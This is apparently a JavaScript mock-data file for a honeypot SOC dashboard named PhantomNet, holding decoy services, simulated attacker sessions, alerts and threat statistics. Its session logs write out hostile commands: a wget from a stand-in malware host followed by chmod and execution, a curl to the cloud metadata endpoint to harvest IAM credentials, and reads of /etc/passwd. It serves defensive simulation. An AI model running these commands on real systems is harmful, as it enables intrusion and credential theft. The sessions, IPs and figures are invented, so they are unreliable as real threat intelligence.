// PhantomNet Realistic SOC Simulation Mock Data

export const initialHoneypots = [
  {
    id: "hp-1",
    name: "SSH Bastion (Ubuntu Core)",
    service: "SSH",
    port: 22,
    ipAddress: "10.240.12.84",
    persona: "Overworked Senior DevOps (Ubuntu 22.04)",
    companyProfile: "OmniCorp Global Financial",
    riskLevel: "Critical",
    status: "active",
    uptime: "14d 6h 32m",
    interactions: 3418,
    dockerContainerId: "pn-ssh-core-01",
    llmModel: "llama3:latest",
    lastInteraction: "Just now",
  },
  {
    id: "hp-2",
    name: "Corporate PostgreSQL Ledger",
    service: "Database",
    port: 5432,
    ipAddress: "10.240.12.90",
    persona: "FinTech DBA (PostgreSQL 15.3)",
    companyProfile: "OmniCorp Global Financial",
    riskLevel: "Critical",
    status: "active",
    uptime: "21d 18h 10m",
    interactions: 2890,
    dockerContainerId: "pn-pg-sandbox-02",
    llmModel: "llama3:latest",
    lastInteraction: "4 mins ago",
  },
  {
    id: "hp-3",
    name: "Internal HR Document FTP",
    service: "FTP",
    port: 21,
    ipAddress: "10.240.14.15",
    persona: "Legacy Sysadmin (vsftpd 3.0.3)",
    companyProfile: "Apex Aerospace R&D",
    riskLevel: "Medium",
    status: "active",
    uptime: "8d 11h 05m",
    interactions: 852,
    dockerContainerId: "pn-ftp-hr-03",
    llmModel: "llama3.2:3b",
    lastInteraction: "18 mins ago",
  },
  {
    id: "hp-4",
    name: "FinCorp Executive File Share",
    service: "File Server",
    port: 445,
    ipAddress: "10.240.14.28",
    persona: "Windows Server 2022 SMB Admin",
    companyProfile: "OmniCorp Global Financial",
    riskLevel: "High",
    status: "active",
    uptime: "31d 02h 44m",
    interactions: 1674,
    dockerContainerId: "pn-smb-exec-04",
    llmModel: "llama3:latest",
    lastInteraction: "1 hour ago",
  },
  {
    id: "hp-5",
    name: "Jenkins CI/CD Internal Portal",
    service: "HTTP",
    port: 8080,
    ipAddress: "10.240.15.50",
    persona: "Careless Junior Platform Engineer",
    companyProfile: "CyberDynamics Defense",
    riskLevel: "High",
    status: "inactive",
    uptime: "0m",
    interactions: 412,
    dockerContainerId: "pn-http-jenkins-05",
    llmModel: "llama3:latest",
    lastInteraction: "2 days ago",
  },
  {
    id: "hp-6",
    name: "Customer API Gateway & Auth",
    service: "HTTP",
    port: 8443,
    ipAddress: "10.240.16.102",
    persona: "Kubernetes Ingress Envoy Proxy",
    companyProfile: "OmniCorp Global Financial",
    riskLevel: "Medium",
    status: "active",
    uptime: "5d 09h 12m",
    interactions: 1980,
    dockerContainerId: "pn-envoy-ingress-06",
    llmModel: "llama3.2:3b",
    lastInteraction: "7 mins ago",
  }
];

export const initialSessions = [
  {
    id: "sess-8941",
    attackerIP: "185.220.101.5",
    country: "Romania",
    countryCode: "RO",
    honeypotId: "hp-1",
    honeypotName: "SSH Bastion (Ubuntu Core)",
    startTime: "2026-10-26 22:48:15",
    duration: "18m 42s",
    commandsCount: 28,
    riskScore: 94,
    status: "active",
    threatCategory: "Cloud Credential Harvesting & Exfiltration",
    canaryTriggered: "CANARY-SWIFT-99281",
    terminalHistory: [
      { id: 1, type: "cmd", text: "ssh admin@10.240.12.84", time: "22:48:15" },
      { id: 2, type: "output", text: "Connected to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-89-generic x86_64)\nLast login: Mon Oct 26 21:14:02 from 192.168.1.10", time: "22:48:16" },
      { id: 3, type: "cmd", text: "whoami && id", time: "22:48:20" },
      { id: 4, type: "output", text: "admin\nuid=1001(admin) gid=1001(admin) groups=1001(admin),27(sudo)", time: "22:48:21" },
      { id: 5, type: "cmd", text: "ls -la /var/www/internal-finance", time: "22:49:05" },
      { id: 6, type: "output", text: "drwxr-xr-x 4 admin admin 4096 Oct 24 14:10 .\ndrwxr-xr-x 8 root  root  4096 Oct 10 09:20 ..\n-rw-r----- 1 admin admin 18420 Oct 26 18:30 Q3_executive_salaries.xlsx\n-rw-r--r-- 1 admin admin  4280 Oct 25 11:15 swift_wire_transfer_keys.pem\n-rw-r--r-- 1 admin admin  9421 Oct 26 08:00 offshore_accounts_audit.csv", time: "22:49:06" },
      { id: 7, type: "cmd", text: "cat swift_wire_transfer_keys.pem", time: "22:50:11" },
      { id: 8, type: "output", text: "-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA3f7YxU9gLLv2908XmC41...\n[PhantomNet Context Engine: Injected LLM decoy key CANARY-SWIFT-99281]\n-----END RSA PRIVATE KEY-----", time: "22:50:12" },
      { id: 9, type: "cmd", text: "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/", time: "22:52:30" },
      { id: 10, type: "output", text: "OmniCorp-Production-Cluster-Role\n[PhantomNet Behavioral Engine: AWS Metadata exfiltration attempted]", time: "22:52:31" },
      { id: 11, type: "cmd", text: "cat /etc/passwd | grep -E 'sh$'", time: "22:55:04" },
      { id: 12, type: "output", text: "root:x:0:0:root:/root:/bin/bash\nadmin:x:1001:1001:DevOps Lead:/home/admin:/bin/bash\ndeploy:x:1002:1002:Automated Deployer:/home/deploy:/bin/bash", time: "22:55:05" }
    ],
    accessedDecoys: {
      files: [
        { name: "swift_wire_transfer_keys.pem", size: "4.2 KB", type: "Security Key", canary: true },
        { name: "offshore_accounts_audit.csv", size: "9.4 KB", type: "Financial Audit", canary: true },
        { name: "Q3_executive_salaries.xlsx", size: "18.4 KB", type: "Spreadsheet", canary: false }
      ],
      emails: [
        { sender: "cfo@omnicorp.internal", subject: "Confidential: Q4 Wire Transfer Authorization", snippet: "Please verify Swift batch code TX-9912 before 24:00 GMT." }
      ],
      dbQueries: [
        { query: "SELECT * FROM swift_routing_numbers WHERE active = true;", rowsReturned: 4 }
      ]
    }
  },
  {
    id: "sess-8942",
    attackerIP: "45.154.255.89",
    country: "Netherlands",
    countryCode: "NL",
    honeypotId: "hp-2",
    honeypotName: "Corporate PostgreSQL Ledger",
    startTime: "2026-10-26 22:30:00",
    duration: "36m 12s",
    commandsCount: 42,
    riskScore: 88,
    status: "active",
    threatCategory: "SQL Injection & Financial Ledger Dump",
    canaryTriggered: "CANARY-DB-CORP-4401",
    terminalHistory: [
      { id: 1, type: "cmd", text: "psql -h 10.240.12.90 -U postgres -d omnicorp_ledger", time: "22:30:01" },
      { id: 2, type: "output", text: "psql (15.3 (Ubuntu 15.3-1.pgdg22.04+1))\nType 'help' for help.\n\nomnicorp_ledger=#", time: "22:30:02" },
      { id: 3, type: "cmd", text: "\\dt", time: "22:30:15" },
      { id: 4, type: "output", text: "             List of relations\n Schema |       Name       | Type  |  Owner   \n--------+------------------+-------+----------\n public | accounts         | table | postgres \n public | customer_cards   | table | postgres \n public | transactions_2026| table | postgres \n(3 rows)", time: "22:30:16" },
      { id: 5, type: "cmd", text: "SELECT * FROM customer_cards LIMIT 3;", time: "22:31:02" },
      { id: 6, type: "output", text: " id | holder_name   | card_number_hash | exp_month | exp_year | cv_token\n----+---------------+------------------+-----------+----------+----------\n  1 | Victoria Reed | 4111-xxxx-xxxx-88|        09 |     2028 | CANARY-V\n  2 | Marcus Vance  | 5500-xxxx-xxxx-12|        11 |     2027 | CANARY-M\n  3 | Chen Wei      | 3782-xxxx-xxxx-90|        04 |     2029 | CANARY-C\n(3 rows generated dynamically by Ollama Context Engine)", time: "22:31:03" }
    ],
    accessedDecoys: {
      files: [],
      emails: [],
      dbQueries: [
        { query: "SELECT * FROM customer_cards LIMIT 3;", rowsReturned: 3 },
        { query: "SELECT account_id, balance_usd FROM accounts ORDER BY balance_usd DESC;", rowsReturned: 15 }
      ]
    }
  },
  {
    id: "sess-8943",
    attackerIP: "103.208.220.14",
    country: "China",
    countryCode: "CN",
    honeypotId: "hp-1",
    honeypotName: "SSH Bastion (Ubuntu Core)",
    startTime: "2026-10-26 21:55:10",
    duration: "52m 10s",
    commandsCount: 19,
    riskScore: 91,
    status: "blocked",
    threatCategory: "Automated Cryptominer Dropper (Blocked)",
    canaryTriggered: "CANARY-HONEY-WGET-001",
    terminalHistory: [
      { id: 1, type: "cmd", text: "wget http://malware-drop.ru/kworker -O /tmp/.kworker", time: "22:10:04" },
      { id: 2, type: "output", text: "--2026-10-26 22:10:04-- http://malware-drop.ru/kworker\nConnecting to malware-drop.ru... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 1492080 (1.4M)\nSaving to: '/tmp/.kworker'\n100%[===================>] 1,492,080  2.10MB/s   in 0.7s", time: "22:10:06" },
      { id: 3, type: "cmd", text: "chmod +x /tmp/.kworker && /tmp/.kworker &", time: "22:10:15" },
      { id: 4, type: "output", text: "[PhantomNet Defense Trigger]: Malware payload trapped in ephemeral sandbox memory. Inbound IP quarantined.", time: "22:10:16" }
    ],
    accessedDecoys: {
      files: [{ name: "/tmp/.kworker (Captured Bin)", size: "1.4 MB", type: "Malware Sample", canary: true }],
      emails: [],
      dbQueries: []
    }
  },
  {
    id: "sess-8944",
    attackerIP: "91.240.118.23",
    country: "Russia",
    countryCode: "RU",
    honeypotId: "hp-4",
    honeypotName: "FinCorp Executive File Share",
    startTime: "2026-10-26 22:15:30",
    duration: "24m 50s",
    commandsCount: 14,
    riskScore: 76,
    status: "ended",
    threatCategory: "SMB Reconnaissance & Ransomware Staging",
    canaryTriggered: "CANARY-SMB-PDF-104",
    terminalHistory: [
      { id: 1, type: "cmd", text: "smbclient //10.240.14.28/ExecutiveShare -U Guest", time: "22:15:30" },
      { id: 2, type: "output", text: "Domain=[OMNICORP] OS=[Windows Server 2022] Server=[Samba 4.15.13]\nsmb: \\> ls", time: "22:15:32" },
      { id: 3, type: "cmd", text: "get M_and_A_Target_List_2027.pdf", time: "22:17:40" },
      { id: 4, type: "output", text: "getting file \\M_and_A_Target_List_2027.pdf of size 245902 as M_and_A_Target_List_2027.pdf (1240.1 KiloBytes/sec) [LLM synthetic PDF delivered]", time: "22:17:42" }
    ],
    accessedDecoys: {
      files: [{ name: "M_and_A_Target_List_2027.pdf", size: "240 KB", type: "Executive Decoy PDF", canary: true }],
      emails: [],
      dbQueries: []
    }
  },
  {
    id: "sess-8945",
    attackerIP: "194.26.29.112",
    country: "Germany",
    countryCode: "DE",
    honeypotId: "hp-3",
    honeypotName: "Internal HR Document FTP",
    startTime: "2026-10-26 22:42:01",
    duration: "09m 11s",
    commandsCount: 8,
    riskScore: 65,
    status: "active",
    threatCategory: "Anonymous FTP Reconnaissance",
    canaryTriggered: "None",
    terminalHistory: [
      { id: 1, type: "cmd", text: "ftp 10.240.14.15 (User: anonymous)", time: "22:42:01" },
      { id: 2, type: "output", text: "230 Guest login ok, access restrictions apply.\nftp> ls -l", time: "22:42:03" }
    ],
    accessedDecoys: {
      files: [{ name: "employee_handbook_v4.pdf", size: "1.2 MB", type: "Document", canary: false }],
      emails: [],
      dbQueries: []
    }
  }
];

export const initialAlerts = [
  {
    id: "alt-501",
    severity: "critical",
    title: "AWS Cloud Metadata Canary Tripped",
    honeypot: "SSH Bastion (Ubuntu Core)",
    honeypotId: "hp-1",
    attackerIP: "185.220.101.5",
    country: "Romania",
    timestamp: "2 mins ago",
    status: "active",
    details: "Attacker queried 169.254.169.254 attempting to extract IAM role keys. Ollama delivered high-enticement canary AWS token CANARY-SWIFT-99281.",
  },
  {
    id: "alt-502",
    severity: "critical",
    title: "Financial Ledger Database Dump Attempt",
    honeypot: "Corporate PostgreSQL Ledger",
    honeypotId: "hp-2",
    attackerIP: "45.154.255.89",
    country: "Netherlands",
    timestamp: "8 mins ago",
    status: "active",
    details: "Automated sqlmap/script executed bulk query against customer_cards. Mock Postgres streamed 100 hallucinated cards with unique trace tags.",
  },
  {
    id: "alt-503",
    severity: "high",
    title: "Malicious ELF Binary Staged in /tmp",
    honeypot: "SSH Bastion (Ubuntu Core)",
    honeypotId: "hp-1",
    attackerIP: "103.208.220.14",
    country: "China",
    timestamp: "25 mins ago",
    status: "resolved",
    details: "Attacker downloaded ELF cryptominer. Binary intercepted by sandbox kernel module and sha256 submitted to threat intelligence registry.",
  },
  {
    id: "alt-504",
    severity: "high",
    title: "Sensitive M&A Decoy Downloaded via SMB",
    honeypot: "FinCorp Executive File Share",
    honeypotId: "hp-4",
    attackerIP: "91.240.118.23",
    country: "Russia",
    timestamp: "45 mins ago",
    status: "reviewed",
    details: "Canary PDF containing trackable beacon opened outside sandbox. Destination ping detected from Moscow subnet.",
  },
  {
    id: "alt-505",
    severity: "medium",
    title: "Brute Force SSH Login Spike Detected",
    honeypot: "SSH Bastion (Ubuntu Core)",
    honeypotId: "hp-1",
    attackerIP: "198.51.100.44",
    country: "United States",
    timestamp: "1 hour ago",
    status: "reviewed",
    details: "420 failed credential combinations in 90 seconds. System seamlessly authenticated attacker using LLM persona trigger.",
  },
  {
    id: "alt-506",
    severity: "low",
    title: "Anonymous FTP Directory Enumeration",
    honeypot: "Internal HR Document FTP",
    honeypotId: "hp-3",
    attackerIP: "194.26.29.112",
    country: "Germany",
    timestamp: "2 hours ago",
    status: "ignored",
    details: "Client listed public HR policy files without executing write commands or exploiting known vsftpd vulnerabilities.",
  }
];

export const threatIntelData = {
  summary: {
    totalIoCsCaptured: 1420,
    canaryTokensActive: 88,
    canaryTokensTriggered: 19,
    adversaryGroupsTracked: 7,
    avgDeceptionDwellTime: "28m 14s",
  },
  topCommands: [
    { command: "cat /etc/passwd", count: 842, category: "Reconnaissance" },
    { command: "uname -a && id", count: 765, category: "System Discovery" },
    { command: "curl 169.254.169.254", count: 489, category: "Cloud Exfiltration" },
    { command: "SELECT * FROM customer_cards", count: 320, category: "Data Thefts" },
    { command: "wget /tmp/.kworker", count: 215, category: "Malware Staging" },
    { command: "netstat -tulnp", count: 180, category: "Network Sniffing" },
    { command: "docker ps -a", count: 142, category: "Container Breakout" },
  ],
  targetedServices: [
    { service: "SSH Shell (Port 22)", percentage: 46, count: 11450, color: "#00e5ff" },
    { service: "PostgreSQL (Port 5432)", percentage: 28, count: 6970, color: "#00ff9d" },
    { service: "HTTP / Web API (Port 80/443)", percentage: 14, count: 3485, color: "#a855f7" },
    { service: "SMB File Share (Port 445)", percentage: 8, count: 1991, color: "#f59e0b" },
    { service: "FTP Storage (Port 21)", percentage: 4, count: 996, color: "#ff3366" },
  ],
  adversaryBehaviorTimeline: [
    { stage: "Initial Foothold", time: "0-2 mins", description: "Attacker attempts brute-force or default credentials; PhantomNet admits them with custom welcome banner." },
    { stage: "Environment Discovery", time: "2-7 mins", description: "Runs whoami, uname, lsb_release, netstat. Ollama returns consistent OS fingerprint." },
    { stage: "Asset Hunting", time: "7-15 mins", description: "Searches /home, /var/www, DB tables for keys, credentials, or customer lists. Context Engine generates persistent decoys." },
    { stage: "Data Exfiltration / Exploitation", time: "15-30+ mins", description: "Downloads canary keys or attempts staging malware. PhantomNet captures payloads & notifies SOC." }
  ],
  attackPatterns: [
    { name: "Cloud Metadata Credential Harvesting (IMDSv1)", frequency: 38, severity: "Critical", mitreId: "T1552.005" },
    { name: "Living-off-the-Land Command Execution (Bash/Curl)", frequency: 72, severity: "High", mitreId: "T1059.004" },
    { name: "Structured SQL Data Exfiltration", frequency: 24, severity: "High", mitreId: "T1567" },
    { name: "Automated Botnet/Miner Staging", frequency: 19, severity: "Medium", mitreId: "T1105" },
    { name: "Canary Token Trigger Outside Sandbox", frequency: 8, severity: "Critical", mitreId: "T1020" }
  ],
  attacksOverTime: [
    { time: "00:00", attacks: 120, blocked: 40 },
    { time: "04:00", attacks: 80, blocked: 25 },
    { time: "08:00", attacks: 240, blocked: 90 },
    { time: "12:00", attacks: 420, blocked: 180 },
    { time: "16:00", attacks: 380, blocked: 150 },
    { time: "20:00", attacks: 590, blocked: 260 },
    { time: "23:59", attacks: 680, blocked: 310 }
  ],
  severityDistribution: [
    { name: "Critical", value: 29, color: "#ff3366" },
    { name: "High", value: 64, color: "#f59e0b" },
    { name: "Medium", value: 112, color: "#00e5ff" },
    { name: "Low", value: 195, color: "#00ff9d" }
  ]
};
